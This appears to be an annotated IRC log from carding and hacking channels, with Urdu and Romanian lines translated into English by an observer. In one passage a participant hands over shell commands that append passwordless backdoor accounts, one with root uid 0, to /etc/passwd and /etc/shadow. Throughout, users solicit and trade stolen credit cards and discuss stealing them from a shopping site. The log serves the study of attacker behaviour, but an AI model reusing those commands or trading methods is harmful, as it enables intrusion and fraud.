@@ -1,0 +1,1064 @@
+:|S4n4m| :tum aisey hi bolna
+
+Just keep on saying like this
+
+:|S4n4m| :karna kuch nahi
+
+dont do anything
+
+:J4n3 :ye baath hai ?
+
+is that the deal?
+
+:|S4n4m| :han
+
+yes
+
+:|S4n4m| :yeh bat hay
+
+that is the deal
+
+:J4n3 :ping bot aaraha hai
+
+the ping bot is coming
+
+:|S4n4m| :instooooooooooooooooooooo
+:|S4n4m| ::)
+:|S4n4m| :karachi mey aooo
+
+come to karachi
+
+:J4n3 :ok bot aagaya
+
+ok the bot is here
+
+:J4n3 :d3s|r3 hai uska nick
+
+it's nick is d3s|r3
+
+:J4n3 :ab main channel par tyep karo ping me
+
+now type in the main channel in ping (Note:: dont know what it translates to)
+
+:J4n3 :<d3s|r3> PiNG THiNGiE - hiall's ping reply took 13 seconds
+:|S4n4m| :hmmm
+:|S4n4m| :tahnks
+:J4n3 :dekha ?
+
+saw that?
+
+:J4n3 :ab khush ?
+
+now are you happy?
+
+:|S4n4m| :han
+
+yes
+
+:|S4n4m| :kush
+
+happy
+
+:J4n3 :bus thum khush raho :)
+
+that's all ... keep staying happy :)
+
+:|S4n4m| :wah
+
+cool
+
+:|S4n4m| :kya bat hay app ki
+
+what shall i say about you
+
+:|S4n4m| :wasey
+:|S4n4m| :mey ney ek bandha rakh leeya hay
+
+i have kept one system for myself
+
+:|S4n4m| :ping key leyya
+
+for pinging
+
+:J4n3 :thumara bandaa 24 hour nahin betay gas
+
+your system wont be for 24 hours (Note:: again i am having difficulty translating - grammar issues in urdu
+
+:J4n3 :mera bot hoga
+
+my bot will
+
+:|S4n4m| :hmmmmmmmmmm
+:|S4n4m| :instoo
+:|S4n4m| :zara 5 min key leyee
+
+for a little bit... 5 mins
+
+:|S4n4m| :karachi channel per
+
+on karachi channel
+
+:|S4n4m| :flori ka interview ley loo
+
+take flori's interview
+
+:|S4n4m| :mey ney appoint kya hay
+
+i have appointed (him/her?)
+
+:J4n3 :hahaha nahin thum khud hee laylo
+
+yes yes, but take it yourself (the interview)
+
+:|S4n4m| :kyon
+
+why?
+
+:|S4n4m| :tum yahn key op hoo
+
+you are the op here
+
+:|S4n4m| :admintration mey hoo
+
+i am in administration
+
+:J4n3 :op thum oh main co-founder hon
+
+you are the op, i am the co-founder
+
+:J4n3 :aaayee meraa dil......chua kay lagyeeee...churanay wali meri qaatil
+
+ohhh.... she stole my heart
+
+:|S4n4m| :han wohi hii
+
+yes, her
+
+:|S4n4m| :hello
+:|S4n4m| :kya hoa
+
+what happened?
+
+:J4n3 :wait
+:J4n3 :.up
+:J4n3 :.op netra
+:J4n3 :.op Ott0
+:Dew :Hey J4n3 u there ?
+:J4n3 :.host add J4n3 *
+:J4n3 :.up
+:J4n3 :OngHome esay $uptime
+:D1ck :J4n3 
+:D1ck :i`m getting my own server;)
+:D1ck :J4n3 
+:D1ck :J4n3 
+:J4n3 :D1ck
+:J4n3 :i'm here
+:D1ck :hehe
+:D1ck :J4n3 
+:J4n3 :hehe
+:J4n3 :D1ck
+:D1ck :oye give me those commands for linux password adding and sun adding re ro re r i gave u
+:D1ck ::P
+:D1ck :i lost mine
+:J4n3 :wait
+:D1ck :and i dont wana make again
+:J4n3 :cp /etc/passwd /etc/.tp;
+:J4n3 :echo "ro::99999::::::" >> /etc/shadow;
+:J4n3 :echo "r::99999::::::" >> /etc/shadow;
+:J4n3 :echo "ro:x:500:1000::/:/bin/bash" >> /etc/passwd;
+:J4n3 :echo "r:x:0:0::/:/bin/bash" >> /etc/passwd;
+:J4n3 :cp /etc/shadow /etc/.ts;
+:D1ck :k
+:J4n3 ::p
+:D1ck :and suhn
+:D1ck :?
+:D1ck :sun
+:D1ck :?
+:J4n3 :wait
+:D1ck :gimme sun tew
+:D1ck :k
+:J4n3 :cp /etc/passwd /etc/.tp;
+:J4n3 :echo "re::6445::::::" >> /etc/shadow;
+:J4n3 :echo "r::10891::::::" >> /etc/shadow;
+:J4n3 :echo "re:x:500:1000:daemon:/:/sbin/sh" >> /etc/passwd;
+:J4n3 :echo "r:x:0:0:User:/:/sbin/sh" >> /etc/passwd;
+:J4n3 :cp /etc/shadow /etc/.ts;
+:D1ck :thx
+:J4n3 :np :p
+:D1ck :oye
+:D1ck :me getting a box
+:D1ck :T+3
+:D1ck :T3
+:J4n3 :wow
+:J4n3 :kewl
+:D1ck :where should i get?
+:D1ck :where is j0e getting
+:D1ck :d4v3 i want the folling domains
+:J4n3 :folling ?
+
+(Note:: misspelt "following")
+
+:D1ck example.org
+:J4n3 :j0e say contact nahi huwa called him 2 times
+
+j0e said there has been no contact ... called him 2 times
+
+:D1ck :wetcunts.net
+:J4n3 :example hmm
+:J4n3 :mil jayega agar register nahi huwa hai tho
+
+we will get it if it has not been registered
+
+:D1ck :undefined.net
+:D1ck :and kewl ones
+:D1ck :but not one's that end with zzz
+:D1ck :like dreamzzz.net
+:D1ck :etc
+:D1ck :eeet.org
+:D1ck :eeet.net
+:D1ck :oye
+:D1ck :how much j0e paid
+:D1ck :and what server?
+:J4n3 :he paid 250 $
+:J4n3 :from example.net
+:D1ck :kewl
+:D1ck :for a T3?
+:J4n3 :and yeah example.org  and com net all available :p
+:J4n3 :T1 i think
+:D1ck :kewl
+:D1ck :get me please
+:D1ck :oh
+:J4n3 :yaar CC :(
+:J4n3 :no CC right now 
+:J4n3 :yaar u have that bind weapon why dont u hit a big shoping site and take cc's ?
+
+(Note:: here's where they hatch the idea of stealing CCs)
+
+:D1ck :yep
+:D1ck :oki
+:D1ck : welp why dont we all hang in 
+:D1ck :it was my channel and i think ti still is
+:J4n3 :abay yaar sub fraud hotha hai wahan par
+
+hey dude, a lot of fraud goes on there
+
+:J4n3 :their CC's do not work
+:D1ck :hehe
+:J4n3 :bauth try kiya hai undernet and effnet par
+
+tried a lot on undernet and effnet
+
+:D1ck :k
+:D1ck :heh k
+:D1ck :<shellad:#shellz> DIGITALINET offers quality web hosting staring at 6$ a
+:D1ck :                  month. Signup for webhosting with digitalinet and get your
+:D1ck :                  domain for 11$ a year
+:D1ck :                  information.
+:D1ck :i`ll buy 2 legit domains there
+:J4n3 :haha i had a shell from there
+:D1ck :kewl
+:J4n3 :they closed shell service now 
+:J4n3 :adult web hosting :p
+:D1ck :lol
+:J4n3 :service achee thee buree nahin thee
+
+the service was good, not bad at all
+
+:D1ck :haha
+:J4n3 :oye sex time
+:J4n3 :brb
+:J4n3 :br
+:J4n3 :bbl
+:J4n3 :shayed so gaya
+
+seems like he's gone to sleep
+
+:D1ck :ahahahha
+:J4n3 :hehe
+:J4n3 :g0ne
+:D1ck :.join 
+:L4stly :Does anyone here have any working Credit Card numbers with full details ?
+:L4stly :Does anyone here have any working Credit Card numbers with full details ?
+:L4stly :Does anyone here have any working Credit Card numbers with full details ?
+:L4stly :Does anyone here have any working Credit Card numbers with full details ?
+:L4stly :Does anyone here have any working Credit Card numbers with full details ?
+:L4stly :Does anyone here have any working Credit Card numbers with full details ?
+:^w1nX^ :cc
+:^w1nX^ :cc
+:^w1nX^ :sleepin chann
+:^w1nX^ :trade
+:^w1nX^ :sleepin chann
+:^w1nX^ :ping me
+:^w1nX^ :ping me
+:^w1nX^ :ping me
+:^w1nX^ :trade
+:atlanta.ga.us.undernet.org 005 spitz SILENCE=15 WHOX WALLCHOPS USERIP CPRIVMSG CNOTICE MODES=6 MAXCHANNELS=15 MAXBANS=30 NICKLEN=9 TOPICLEN=160 KICKLEN=160 MAP :are supported by this server
+:^w1nX^ :ping me
+:^w1nX^ :ping me
+:^w1nX^ :ping me
+:^w1nX^ :ping me
+:^w1nX^ :ping me
+:^w1nX^ :ping me
+:nirvana19 :e cinevA de aici si pe rocarding?
+@ is somebody here also on #rocarding?
+
+(Note:: definitely not urdu here
+
+:^w1nX^ :ping me
+:^w1nX^ :ping me
+:^w1nX^ :ping me
+:^w1nX^ :ping me
+:^w1nX^ :ping me
+:Bl4ck_ :not again
+:Bl4ck_ :-up
+:nirvana19 :I buy stuff
+:SLaZz :who wants to trade cc's ??
+:nirvana19 :gfnbfg
+:nirvana19 :someone from romania?
+:savantul :yes
+:_Mephisto :multi
+@ a lot of (people)
+:_Mephisto ::)
+:nirvana19 :aveti ceva marfa?
+@do you have some stuff?
+
+(Note:: ??)
+
+:nirvana19 :cumpar
+@ I buy
+
+:_CardMan_ :re ppl
+:Bl4ck_ :arrrrrrrrrrrrrrrrr
+:Bl4ck_ :-up
+:_CardMan_ :what is new ?
+:Bl4ck_ :shitttttttttttttt
+:_CardMan_ :stupid bots
+:Bl4ck_ :-up
+:Bl4ck_ :-up
+:_CardMan_ :this is fun....
+:Bl4ck_ :Omblad0n up
+:Bl4ck_ :Omblad0n op
+:Bl4ck_ ::>>
+:Bl4ck_ :arrrrrr
+:_CardMan_ :Bl4ck_....do u know what u r doing ?
+:Bl4ck_ :dunoo
+:_CardMan_ :i saw....
+:_CardMan_ :so ... any romanian people here ?
+:bug____ :ops
+:_CardMan_ :bug____...whats up ?
+:savantul :lots
+:bug____ :nimic man
+@ nothing man
+
+:_CardMan_ :ok...
+:bug____ :I need cc
+:bug____ :lol
+:_Mephisto :me too
+:_CardMan_ :pai care e din bucale si are niste cc-uri bune (NU bunicele, sau extrapolate) sa initieze o privata repede....
+@ so, those who is from Bucharest and who has some good cc (NOT "good enough" or extrapolated), let's start fast "a private one" (conversation) ...
+
+(Note:: ??)
+
+:nirvana19 :da o gramada de romanian pepole pe aici
+@ lots of romanian people here
+
+(Note:: ??)
+
+:bug____ :1 cc
+:bug____ :1
+:_CardMan_ :pai care e din bucale si are niste cc-uri bune, nu vrajeli sa initieze o privata repede....
+@ so, those who is from Bucharest and who has some good cc, not bogus, let's start fast "a private one" (conversation) ...
+
+:_CardMan_ :care esti pe kappa (IP: 192.168.254.95
+:_CardMan_ :DNS: dialup-56k-95.example.xx
+:_CardMan_ :si dai cu scanarea ?
+@ who are you on kappa (IP: 192.168.254.95
+@ DNS: dialup-56k-95.example.xx ( kappa.ro ??)
+@ and are you scanning ?
+
+:nirvana19 :de unde pot sa fac rost de Legion 2.1
+@where can I get Legion 2.1
+
+:_Mephisto :de la mine
+@from me
+
+:_CardMan_ :nirvana19.... LOLZ... nu stiai ca are back door mah ?
+@ ...LOLZ... didn't you knew that is has backdoor?
+
+:nirvana19 :poti sa mi-l dai?
+@ could you give it to me?
+
+:dlotos33 :Is there any Romania friends?
+:bug____ :nope
+:dlotos33 :Is there any Romania friends?
+:_CardMan_ :a lots 
+:Co0lWoRx :any1 here wanna earn +v, msg me
+:Co0lWoRx :any1 here wanna earn +v, msg me
+:v|Adu :re 
+:v|Adu ::)
+:Co0lWoRx :ACTION any1 here wanna earn +v, msg me
+:v|Adu :anybody need a drop place ?
+:nirvana19 :de unde esti ma vladule?
+@ where are you from vladu?
+
+:_CardMan_ :v|Adu.... lasa-te de meserie ....
+@ ... got it lost ....
+
+:v|Adu ::)))))))
+:v|Adu :cardman 
+:v|Adu ::)
+:v|Adu :hahahahah
+:v|Adu ::)
+:_CardMan_ :suck it 
+
+(Note:: ?? - all this is either romanian or some other language)
+@ yes, this is romanian slang
+
+
+:Co0lWoRx :ACTION any1 here wanna earn +v, msg me
+:nirvana19 :sorry
+:Co0lWoRx :ok
+:Co0lWoRx :np
+:xroach :anybody have any driver license template ? 
+:xroach :anybody have any driver license templates ? 
+:bug____ :u can save my ass with  1 cc
+:xroach :actually any good templates would be nice
+:bug____ :I got some sites
+:v|Adu :re 
+:Co0lWoRks :ACTION any1 wanna earn +v in 
+:Co0lWoRks :ACTION any1 wanna earn a virgin card, msg me now
+:Co0lWoRks :ill bbl, since no one wants anything here
+:Bl4ck_ :-up
+:Bl4ck_ :?
+:Bl4ck_ :soory
+:Bl4ck_ :I`ll go
+:dlotos33 :anyone have CC?
+:s1z1f :yes
+:xroach :anyone have or know where i could get license templates or any templates for mag cards ? 
+:s1z1f :do enyone have cc?
+:dlotos33 :Does any one speak germany?
+:_CardMan_ :do not think so ...
+:2red :i speak some german
+:2red :why?
+:dlotos33 :What means "ORT" at GERMANY?
+:2red :city?
+:dlotos33 :thank you ,my friend
+:MaTiX_00 :hello
+:MaTiX_00 :anyone got a proxy for me to use?
+:dlotos33 :yes
+:SpRiTe^^^ :HI
+:_CardMan_ :pai care e din bucale si are niste cc-uri bune, nu vrajeli sa initieze o privata repede....
+@ (idem)
+
+:SpRiTe^^^ : xxxx xxxx xxxx xxxx
+:SpRiTe^^^ : xxxx xxxx xxxx xxxx
+:SpRiTe^^^ : xxxx xxxx xxxx xxxx
+:SpRiTe^^^ : xxxx xxxx xxxx xxxx
+:SpRiTe^^^ : xxxx xxxx xxxx xxxx
+:SpRiTe^^^ : xxxx xxxx xxxx xxxx
+:SpRiTe^^^ :4,4 xxxx xxxx xxxx xxxx
+:SpRiTe^^^ :0,4 xxxx xxxx xxxx xxxx
+:SpRiTe^^^ :4,4 xxxx xxxx xxxx xxxx
+:SpRiTe^^^ :0,0 1,1 xxxx xxxx xxxx xxxx
+:kurky :Any GOOOOOOOD carders here? msg me
+:kurky :Anyone here got a UK cc??? Msg me
+:kurky :Anyone here got a UK cc??? Msg me for trade for Virgin VISA
+:][VaMpIrE :hi
+:][VaMpIrE :wanna trade?
+:kurky :Anyone here got a UK cc??? Msg me for trade for Virgin VISA
+:_CardMan_ :pai care e din bucale si are niste cc-uri bune, nu vrajeli sa initieze o privata repede....
+@ (idem)
+
+:_CardMan_ :m4r1n4ru...salve mah 
+@ m4r1n4ru...hello man
+
+:m4r1n4ru :-op
+:xroach :anybody have any dl templates ? cia/fbi/nsa would be cool too
+:s1z1f :do enybody have cc?
+:kurky :Anyone here got a UK cc??? Msg me for trade for Virgin VISA
+:s1z1f :do enybody have cc?
+:[SK]Kane :care aveti un proxy bun de www?
+@ who has a good www proxy?
+
+:_CardMan_ :pai care e din bucale si are niste cc-uri bune, nu vrajeli sa initieze o privata repede....
+@ (idem)
+
+:SpRiTe^^^ :H
+:SpRiTe^^^ :ok
+:m4r1n4ru :-op
+:s1z1f :do enybody have cc?
+:s1z1f :do enybody have cc?
+:dariuss :am yo 1000
+:s1z1f :do enybody have cc?
+:natedogg :i do..
+:s1z1f :pls give it to me
+:natedogg :trade...
+:natedogg :mgs me..
+:s1z1f :pls give it to me
+:s1z1f :do enybody have cc?
+:natedogg :sizif ---------------banned#no more trade kind.....
+:s1z1f :do enybody have cc?
+:s1z1f :pls give it to me
+:s1z1f :do enybody have cc?
+:pimpg :yeah
+:pimpg :if you would like one you have to send me one first
+:pimpg :then if it approves
+:s1z1f :ok
+:pimpg :i will send one to you
+:pimpg :sound good
+:pimpg :pm me if you would like me 2
+:D1ck :Tota1KaaS join #delusion
+:D1ck :Tota1KaaS say #delusion Ok, NOW introducing the the First Shell hosting company in pakitan, with excellent domains, Vhosts ip, bots, on a T3 HUB, coming soon.
+:D1ck :Tota1KaaS say #delusion If interested say on main, and one of the admins will message :)
+:D1ck :Tota1KaaS say #delusion Ok, NOW introducing the the First Shell hosting company in pakitan, with excellent domains, Vhosts ip, bots, on a T3 HUB, coming soon.
+:D1ck :Tota1KaaS say #delusion If interested say on main, and one of the admins will message :)
+:dariuss :Bl4ck_-))
+:Bl4ck_ :se man
+:s1z1f :*** pimpg (~ricky@exo01-ca.example.net) has joined 
+:s1z1f :*** Retrieving 
+:s1z1f :<s1z1f> do enybody have cc?
+:s1z1f :<s1z1f> pls give it to me
+:s1z1f :*** Retrieving 
+:s1z1f :*** natedogg has quit IRC (Signed off)
+:s1z1f :<s1z1f> do enybody have cc?
+:s1z1f :<pimpg> yeah
+:s1z1f :<pimpg> if you would like one you have to send me one first
+:s1z1f :<pimpg> then if it approves
+:Ghici :re ppl
+:pimpg :hello
+:pimpg :would anyone like to trade, i dont go first
+:D1ck :D4v3
+:D1ck :WHEN BACK MSG ME
+:s1z1f :do enybody have cc?
+:dariuss :ACTION c ya
+:m4r1n4ru :Away
+:m4r1n4ru :I have Returned.
+:m4r1n4ru :Away
+:s1z1f :do enybody have cc?
+:m4r1n4ru :Away
+:Bon_Jovi :m4r1n4ru 
+:s1z1f :do enybody have cc?
+:Bon_Jovi :yep
+:m4r1n4ru :Away
+:m4r1n4ru :Away
+:s1z1f :do enybody have cc?
+:m4r1n4ru :Away
+:D1ck :hey J4n3
+:J4n3 :what's new :p ?
+:D1ck :server
+:D1ck :buying
+:D1ck :but what did j0e say
+:D1ck :which is good one?
+:J4n3 :buying ? confirmed ?
+:D1ck :i got 10 domains
+
+(Note:: at this point i guess they have closed the deal with the previous CCs)
+
+:D1ck ::P
+:D1ck :freind bought them
+:D1ck :hreh
+:D1ck :yup
+:J4n3 :usay khud sahi nahi patha usnay sirf example try kiya hai aur wo sahi nahi laga usay
+
+he himself doesnt know really, he just tried example and it didnt look all right to him
+
+:D1ck :example.net sux?
+:D1ck :oh
+:J4n3 :great  
+:D1ck :(@J4n3): great
+:D1ck :?
+:J4n3 :haha u said friend already bought it ?
+:D1ck :domains
+:D1ck ::)
+:J4n3 :oh
+:J4n3 :but from where u planning to buy ?
+:D1ck :kuch samhaj nahi aa rahi
+
+cant understand anything
+
+:D1ck :where should i buy
+:D1ck :Server Space: Single Server
+:D1ck :IP Numbers: 30
+:D1ck :Bandwidth: 50 Gigs
+:D1ck :Services: Level 1 (Included)
+:D1ck :Monitor: 24/7 Network Monitoring (Included)
+:D1ck :--------------------------------------------------------------------------------
+:D1ck :Payment Plan: $2,182.80 paid Annually
+:D1ck :Setup Fee: $100.00
+:D1ck :--------------------------------------------------------------------------------
+:D1ck :Total Startup: $2,282.80
+:D1ck :SkyNetWEB Ltd.
+:D1ck :3500 Boston St.
+:D1ck :Baltimore Maryland, 21224
+:D1ck :Phone: 410.563.6384
+:D1ck :Fax: 410.563.5457
+:D1ck :Server Space: Single Server
+:D1ck :IP Numbers: 30
+:D1ck :Bandwidth: 50 Gigs
+:J4n3 :2,828 ?
+:D1ck :Services: Level 1 (Included)
+:D1ck :Monitor: 24/7 Network Monitoring (Included)
+:D1ck :--------------------------------------------------------------------------------
+:D1ck :Payment Plan: $2,182.80 paid Annually
+:D1ck :Setup Fee: $100.00
+:D1ck :--------------------------------------------------------------------------------
+:D1ck :Total Startup: $2,282.80
+:D1ck :SkyNetWEB Ltd.
+:D1ck :3500 Boston St.
+:D1ck :Baltimore Maryland, 21224
+:D1ck :Phone: 410.563.6384
+:D1ck :Fax: 410.563.5457
+:D1ck :yeah
+:D1ck :per year
+:D1ck ::(?
+:D1ck :or :?
+:J4n3 :but he got it about 800 $ total i think with all system p2 400 64 mb ram and 8.4 gb hd
+:D1ck ::)?
+:m4r1n4ru :Away
+:D1ck :but
+:D1ck :that was one month
+:D1ck :remmeber?
+:J4n3 :hmm
+:J4n3 :u mean thats all for one year ?
+:J4n3 :and u gonna pay for it ?
+:D1ck :tell me
+:D1ck :what should i do?
+:D1ck :i`m confewsed
+
+(Note:: you man "confused"... kiddie)
+
+:J4n3 :yaar aaj raath tak wait karlo
+
+dude, wait till tonight
+
+:J4n3 :let me ask some more ppl
+:D1ck :oki
+:J4n3 :teeek haina ?
+
+it's ok with you, right?
+
+:J4n3 :i'll ask miller too
+:D1ck :oki
+:D1ck :ok
+:D1ck :my budget is 170-200/month
+:J4n3 :hmm k
+:D1ck :>Domain Name 1....: example.com
+:D1ck :>Domain Name 2....: example.com
+:D1ck :>Domain Name 3....: example.com
+:D1ck :>Domain Name 4....: example.com
+:D1ck :>Domain Name 5....: example.com
+:D1ck :>Domain Name 6....: example.com
+:D1ck :>Domain Name 7....: example.com
+:D1ck :>Domain Name 8....: example.com
+:D1ck :>Domain Name 9....: example.com
+:D1ck :>Domain Name 10...: example.com
+:D1ck :>Total............: $649.50
+:J4n3 :oh already registered ?
+:D1ck :yup
+:J4n3 :how many years ?
+:D1ck :1
+:J4n3 :thats expensive
+:J4n3 :wait
+:D1ck :who cares
+:D1ck :its cared
+:J4n3 :let me check
+:J4n3 :oh
+:J4n3 :then its ok but wait
+:D1ck :oki
+:D1ck :(Sephirot): I need help , SOme one can help me
+:J4n3 :heh
+:D1ck :=p
+:J4n3 :oye
+:D1ck :?
+:J4n3 :u could got those 10 domain for 2 years at 300 $   and for 5 years at 750 $
+:D1ck :kewl
+:D1ck :from where?
+:J4n3 :dotster
+:D1ck :dotster.com
+:D1ck :?
+:J4n3 :1 year: $15  2 year: $30 
+:J4n3 :5 year: $75 10 year: $150 
+:J4n3 ::)
+:J4n3 :yeah
+:D1ck :cool
+:D1ck ::P
+:J4n3 :we'll get more from there
+:D1ck :oki
+:D1ck :;)
+:D1ck :yaar
+
+dude
+
+:D1ck :i want the server
+:D1ck :b4d
+:D1ck :kuch samhaj nahin aa rahi
+
+cant understand anything
+
+:J4n3 :haha jald baazi math karo 
+
+haha, dont make haste
+
+:D1ck :oye who could make a kewl kewl kewl webpage for webhosting and shell accounts?
+:m4r1n4ru :Away
+:J4n3 :coz u going to pay from ur pocket
+:D1ck :lol oki
+:J4n3 :zara ache thara maaloom karnay do
+
+let's locate some good chap
+
+:D1ck :ok;)
+:J4n3 :page design karnay ka masla nahi wo hojayega dont worry
+
+dont worry about the page design problem, it shall be done
+
+:D1ck :oki kewl
+:D1ck ::)
+:D1ck :oye
+:J4n3 :i'm gonna open a cosmetics shop at tariq road :p
+:D1ck :1pani nay apna server liya tha or rent?
+
+has j0e bought the server or rented it?
+
+(Note:: aek in hindi/urdu - pronounce: ache... means one. so 1pani would be j0e that they
+always refer to)
+
+:J4n3 :yea ?
+:J4n3 :liya tha
+
+had bought it
+
+:D1ck :kewl hehe
+:D1ck ::/
+:D1ck ::/
+:J4n3 :agar thum kaho tho j0e kee baath karwatha hon thum say
+
+if you say so, i can tell you j0e's deal
+
+:D1ck :oh
+:J4n3 :usay kahonga thumain call karday
+
+i will ask him to call you
+
+:J4n3 :ok ?
+:D1ck :ok
+:D1ck :sure
+:D1ck ::)
+:D1ck :but after 9
+:D1ck :but after 9 pm
+:J4n3 :teeek hai phir khud hee pooch lena sub kuch
+
+ok then just ask him everything yourself
+
+:D1ck :coz i`ll be sleeping
+:J4n3 :hmm ok
+:D1ck :k;/
+:D1ck :;/
+:J4n3 ::)
+:J4n3 :tariq road , cosmetic shop, kewl kewl bachiyan *wink*
+
+bachiyan = chicks
+
+:D1ck :lol
+:D1ck :hahahaha
+:J4n3 :hehe yeah
+:J4n3 :have u seen that new building dolmen mall ?
+:D1ck ::P
+:D1ck :nop
+:m4r1n4ru :Away
+:J4n3 :hmm phir dekhna , its kewl and most beautiful market in karachi
+
+hmmm then take a look at it, it's cool and most beautiful market in karachi
+
+:J4n3 :yaar give me a kewl host , aisa jis main psybnc chalaon aur crash na ho, meray ziyad thar roots main make command work nahi kartha :(
+
+dude, give me a cool host, such that if we run psybnc on it, it doesnt crash.
+
+(Note:: i am having problems with some urdu words, but the word-by-word translation for
+the rest of it is:
+
+meray = mine
+main = in
+nahi = doesnt
+kartha = happens
+
+the last part is.."make command doesnt work in this")
+
+:D1ck ::))
+:D1ck :oh
+:D1ck :i will send u psybnc-compiled
+:D1ck :when i boot
+:D1ck ::)
+:J4n3 :oh then its kewl :)
+:J4n3 :tight
+:J4n3 :for sparc na ?
+:D1ck :yeps
+:J4n3 :great waiting ...
+:D1ck :abey abhi ruk heheheh
+
+hey wait for now heheheh
+
+:D1ck :i am tlking to the person for col
+:D1ck ::P
+:D1ck ::pPpp
+:J4n3 :haha ruka huwa hon jub boot karo tho daydena hehe
+
+haha, i am waiting. when you boot then give it up hehe
+
+:D1ck :*** Joins: tOpDaWgGy (KoRn@spc-isp-tor-58-18-419.example.xx)
+:D1ck :(tOpDaWgGy): dAwGgGYY
+:D1ck :(tOpDaWgGy): chinii
+:D1ck :(tOpDaWgGy): jApAniIii
+:D1ck :(@D1ck): hEYyYYyYy
+:D1ck :(@D1ck): dOgYY
+:D1ck :hehehe
+:J4n3 :hehehe
+:D1ck ::)
+:m4r1n4ru :Away
+:D1ck :oye
+:D1ck :read
+:D1ck :http://www.example.net/Contracts/CIT-Colocation%20Agreement.html
+:D1ck :tell me i it have some clawa
+:D1ck :tell me i it have some claws
+:J4n3 :wait
+:D1ck :k
+:J4n3 :errror araha hai
+
+there's an error
+
+:D1ck :works for me
+:J4n3 :hmm nope not working let me try on netscape
+:D1ck :k
+:D1ck :(tOpDaWgGy): shAe.. dAwG bhai
+:J4n3 :Plan A:  20 gigs/month [64kbps avg.], * up to 30 IP addresses  ($150.00
+:J4n3 :      per month)
+:D1ck :is ko doggy kay ilawa
+
+this one as an alternative to doggy
+
+:J4n3 :thats what u want to buy ?
+:D1ck :nope
+:D1ck :40 gig
+:D1ck :256 ips
+:J4n3 :Plan B:  40 gigs/month [128kbps avg], * up to 62 IP addresses  ($250.00
+:J4n3 :      per month)
+:J4n3 :its 62 in 40 gigs
+:D1ck :yep but he sed he will allow 256 if not needed
+:D1ck :needded
+:J4n3 :oh then its okay package is kool
+:D1ck :kewl
+:J4n3 :.msg G_u_Y__  abay oye chichoray mmoooon band kar apna 
+
+hey you squirt, shut your mouth
+
+PRIVMSG G_u_Y__ :abay oye chichoray mmoooon band kar apna 
+
+hey you squirt, shut your mouth
+
+:D1ck :best firwalling and dos protection in town
+:D1ck :lol
+:J4n3 :hmm kewl
+:J4n3 :oye add my this host to bots plz :)
+:m4r1n4ru :Away
+:D1ck :sure
+:D1ck :whats yure ip
+:D1ck :/whois J4n3
+:J4n3 :*
+:D1ck :onghome.com
+:D1ck :oki
+:D1ck :.host add J4n3 *
+:D1ck :brb
+:J4n3 :thanx :)
+:m4r1n4ru :Away
+:J4n3 :.join #karachi
+:m0sTwAnTdpinG
+:G_u_Y__
+
+you and i will get along well
+
+:J4n3 :.msg #karachi GUY ullooo kay pattay moon band rakko apna
+
+you stupid chaps, keep your mouth shut
+
+:sawera
+
+hey ask those who are about to die what their last wish is
+
+:G_u_Y__
+:J4n3 :oops
+:J4n3 : ?
+:J4n3 :say A?
+:G_u_Y__
+
+dearest
+
+:J4n3 :.say #karachi GUY Ullooo kay pattay mooon band rakko apna :p
+
+you stupid chaps, keep your mouth shut
+
+:J4n3 :.part #karachi
+:m4r1n4ru :Away
+:D1ck :J4n3
+:D1ck :my dadi's bro died today, so my dad is off to lahore
+:D1ck :shit
+:D1ck :ab this kaam will latkofy
+
+now this work will be left hanging
+
+:J4n3 :oh
+:J4n3 :Inna lillaaye wa inna ilayae raajioon
+
+(Note:: some prayer to allah it seems)
+
+:J4n3 :very sorry
+:D1ck ::p
+:D1ck :yep he was 85, this is life, ppl come and go
+:D1ck :hehe
+:D1ck :its ok
+:D1ck :;)
+:J4n3 :oh
+:D1ck ::)
+:J4n3 :phir tho time tha jaanay ka unkay
+
+then it was time for him to go
+
+:J4n3 :i thought he was young
+:J4n3 ::p
+:D1ck :nop
+:D1ck :hehe
+:J4n3 :hehe
+:D1ck ::)
+:D1ck :oye
+:D1ck :what i say is
+:D1ck :hm
+:J4n3 :is ?
+:D1ck :chalo time mil gaye ga
+
+come we shall get the time
+
+:D1ck :now we can investiagte
+:J4n3 :yeah yeah
+:J4n3 ::)
+:D1ck :(g|nger`): well
+:D1ck :(g|nger`): i have like 20
+:D1ck :(g|nger`): example.org example.org example.com example.net example.com example.com example.org will-fuck-up-example.com example.com example.com example.com example.com example.com
+:D1ck :(g|nger`): plus others
+:D1ck :(g|nger`): you can have whatever vhosts you want
+:D1ck :kewl?
+:m4r1n4ru :Away
+:J4n3 :yeah kewl
+:D1ck :PHAT6
+:D1ck :;pp
+:J4n3 :if we have domains, we can have vhost of whatever we like
+:D1ck :yaar is it possibl that u can help me with wrebpage :P?
+:D1ck :i cant do alone, coz i have 0-webpage skilzl
+:D1ck :hehe
+:J4n3 :yeah yeah i'm with u always
+:J4n3 ::)
+:D1ck :iknowheh
+:J4n3 :dont feel ur self alone
+:D1ck :kool:)
+:D1ck :kleet
+:J4n3 ::)
+:D1ck :aur sunao
+
+so what else is new?
+
+:D1ck :what haWt
+:J4n3 :nutthin hot naveed nay chars maanga hai hehe
+
+nothing's hot. naveed has asked for some marijuana (chars = marijuana/pot)
+
+:D1ck :HAHAHAHAAHAHA
+:J4n3 :hehehe yeah
+:D1ck :woh charas peeta hai? apni girlfreind ka chakroon may juis nay is ko ghaas nahindali?
+
+does he do marijuana? (Note:: something about his girlfriend being involved in marijuana too)
+
+:D1ck :ROFL
+:J4n3 :lol 
+:D1ck ::)
+:D1ck ::)
+:J4n3 :hah chars tho shroo say peetha hai pehlay bee main day chuka hon usko
+
+hah. he was having marijuana since the beginning. earlier i had given him some too
+
+:D1ck :lol
+:D1ck :oki
+:D1ck :tum charas latay hoon?
+
+do you also do marijuana?
+
+:[Agent] :anyone wants to have proxy list, cc list, RH bash shell eggable..msg me if ur serious
+:J4n3 :haan , i have many relations with drug mafia hehe
+:D1ck :(if answer=yes) { d4v3== "should not take" else printf ("its ok\n");
+:D1ck :lol
+:Flapjack- :Anyone trade cc for bnc? Msg me
+:D1ck :char drugs[80]'
+:D1ck :char drugs[80];
+:J4n3 :hehe
+:J4n3 :lol
+:D1ck ::)
+:J4n3 :main bee peetha hon kabee kabee mood hoay par
+
+i have some depends on the mood
+
+:D1ck :oh
+:D1ck :(@|S4n4m|): wasalamz
+
+salutations
+
+:D1ck :(sawera): w/salam
+:D1ck :chix?
+:D1ck :bawt?
+:J4n3 :yup |S4n4m| = mine
+:D1ck :hahaa
+:D1ck :all-chicks = yure
+:dmonchild :ACTION i am selling hardware if your intrested please /msg me for prices thanks
+:J4n3 :<|S4n4m|> key tum ko kuch kam karna hay
+
+hey do you want to do some work?
+
+:J4n3 :> thum falsafi kub say ban gayee ?
+
+since when did you become a philosopher?
+
